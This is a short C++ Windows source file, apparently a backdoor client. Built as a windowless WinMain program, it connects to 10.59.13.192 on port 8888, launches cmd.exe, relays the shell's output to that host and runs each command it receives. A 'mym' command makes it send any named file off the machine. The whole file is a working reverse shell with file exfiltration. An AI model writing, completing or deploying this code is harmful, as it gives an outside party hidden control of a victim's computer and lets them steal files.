#pragma comment(lib, "ws2_32.lib")  
#include<WinSock2.h>
#include"MySocket.h"
#include<string>
#include<iostream>
#include"Shell.h"
int _stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
	) 
/*int main()*/{
	MySocket s1;
	s1.SocketInit("10.59.13.192", 8888,false);
	string test;
	Shell shell;
	shell.RunProcess(TEXT("C:\\Windows\\System32\\cmd.exe"));
	cout << "Client" << endl;
	int rec = 0;
	shell.GetOutput(">", 2000, test);
	s1.SocketSend(test);
	while (true) {
		
		test.erase();
		s1.SocketRecv(test);
		cout << test << endl;
		if (test == "000") {
			break;
		}
		else if (test.substr(0, 3) == "mym") {//以"mym"开头则复制文件
			s1.SocketSendF(test.substr(4));
			continue;
		}
		shell.SetInput(test);
		test.erase();
		shell.GetOutput(">", 2000, test);
		s1.SocketSend(test);
		
		
		
	}
	
	
}